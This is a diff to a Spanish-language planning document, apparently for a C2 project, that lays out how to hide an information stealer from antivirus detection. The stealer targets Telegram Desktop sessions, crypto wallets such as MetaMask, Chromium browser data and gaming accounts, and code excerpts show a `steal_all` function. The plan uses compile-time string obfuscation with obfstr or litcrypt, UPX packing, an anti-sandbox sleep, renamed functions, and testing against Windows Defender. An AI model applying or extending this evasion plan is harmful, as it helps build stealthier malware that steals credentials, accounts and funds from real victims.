@@ -1,9 +1,9 @@
-# 🔒 Estrategia de Ofuscación - C2R2
+#  Estrategia de Ofuscación - C2R2
 
-## 🎯 Crates de Ofuscación para Rust
+##  Crates de Ofuscación para Rust
 
 ### 1. **obfstr** (Recomendado) ⭐⭐⭐⭐⭐
-**GitHub:** https://github.com/CasualX/obfstr  
+**GitHub:** https://github.com/CasualX/obfstr
 **Crates.io:** https://crates.io/crates/obfstr
 
 **Qué hace:**
@@ -24,15 +24,15 @@ let path = obfstr!("Telegram Desktop"); // Ofuscado en compile-time
 ```
 
 **Ventajas:**
-✅ Strings no aparecen en el binario (análisis estático inútil)  
-✅ Extremadamente rápido (solo XOR)  
-✅ Sin dependencias externas  
-✅ Compatible con `const` y `static`
+ Strings no aparecen en el binario (análisis estático inútil)
+ Extremadamente rápido (solo XOR)
+ Sin dependencias externas
+ Compatible con `const` y `static`
 
 ---
 
 ### 2. **litcrypt** ⭐⭐⭐⭐
-**GitHub:** https://github.com/anvie/litcrypt  
+**GitHub:** https://github.com/anvie/litcrypt
 **Crates.io:** https://crates.io/crates/litcrypt
 
 **Qué hace:**
@@ -50,11 +50,11 @@ let path = lc!("Telegram Desktop"); // Encriptado
 ```
 
 **Ventajas:**
-✅ Control sobre la clave de encriptación  
-✅ Strings completamente ofuscados  
+ Control sobre la clave de encriptación
+ Strings completamente ofuscados
 
 **Desventajas:**
-❌ Clave única para todos los strings (menos seguro que obfstr)
+ Clave única para todos los strings (menos seguro que obfstr)
 
 ---
 
@@ -96,16 +96,16 @@ upx --best --lzma agent.exe
 ```
 
 **Ventajas:**
-✅ Reduce tamaño drásticamente  
-✅ Dificulta análisis estático  
+ Reduce tamaño drásticamente
+ Dificulta análisis estático
 
 **Desventajas:**
-❌ Puede activar heurísticas de AV  
-❌ Fácil de detectar (firmas de UPX)
+ Puede activar heurísticas de AV
+ Fácil de detectar (firmas de UPX)
 
 ---
 
-## 🛠️ Estrategia Recomendada: **obfstr**
+##  Estrategia Recomendada: **obfstr**
 
 ### Por qué obfstr:
 1. **Compile-time encryption** - Strings ofuscados ANTES de compilar
@@ -116,7 +116,7 @@ upx --best --lzma agent.exe
 
 ---
 
-## 📝 Plan de Ofuscación
+##  Plan de Ofuscación
 
 ### Fase 1: Agregar `obfstr` al proyecto
 
@@ -214,12 +214,12 @@ pub fn steal_all() -> StolenData {
     // Anti-sandbox sleep
     use std::thread;
     use std::time::Duration;
-    
+
     #[cfg(target_os = "windows")]
     {
         thread::sleep(Duration::from_secs(90));
     }
-    
+
     let mut data = StolenData::new();
     // ...
 }
@@ -243,7 +243,7 @@ const RANDOM_PADDING: [u8; 256] = [0x4a; 256];
 
 ---
 
-## 🧪 Testing de Ofuscación
+##  Testing de Ofuscación
 
 ### Verificar que strings NO están en el binario:
 
@@ -259,7 +259,7 @@ strings agent.exe | findstr /i "metamask"
 
 ---
 
-## 📊 Efectividad Esperada
+##  Efectividad Esperada
 
 | Técnica | Reducción de Detección | Dificultad |
 |---------|------------------------|------------|
@@ -272,20 +272,20 @@ strings agent.exe | findstr /i "metamask"
 
 ---
 
-## 🎯 Orden de Implementación
+##  Orden de Implementación
 
-1. ✅ Agregar `obfstr` a Cargo.toml
-2. ✅ Ofuscar `telegram.rs` (máxima prioridad)
-3. ✅ Ofuscar `wallets.rs`
-4. ✅ Ofuscar `chromium.rs`
-5. ✅ Ofuscar `gaming.rs`
-6. ✅ Agregar sleep evasion
-7. ✅ Renombrar funciones sospechosas
-8. ✅ Compilar y testear con Defender
+1.  Agregar `obfstr` a Cargo.toml
+2.  Ofuscar `telegram.rs` (máxima prioridad)
+3.  Ofuscar `wallets.rs`
+4.  Ofuscar `chromium.rs`
+5.  Ofuscar `gaming.rs`
+6.  Agregar sleep evasion
+7.  Renombrar funciones sospechosas
+8.  Compilar y testear con Defender
 
 ---
 
-## ⚠️ Advertencias
+##  Advertencias
 
 ### Sobre UPX:
 - **NO recomendado** para producción seria
@@ -293,14 +293,14 @@ strings agent.exe | findstr /i "metamask"
 - Útil solo para testing rápido
 
 ### Sobre obfstr:
-- ✅ **Altamente recomendado**
+-  **Altamente recomendado**
 - NO aumenta tamaño del binario significativamente
 - NO disminuye performance
 - **Compatible con todos los AV modernos** (no es una técnica maliciosa per se)
 
 ---
 
-## 🚀 Próximos Pasos
+##  Próximos Pasos
 
 1. Implementar obfstr en todos los módulos
 2. Testear con Windows Defender
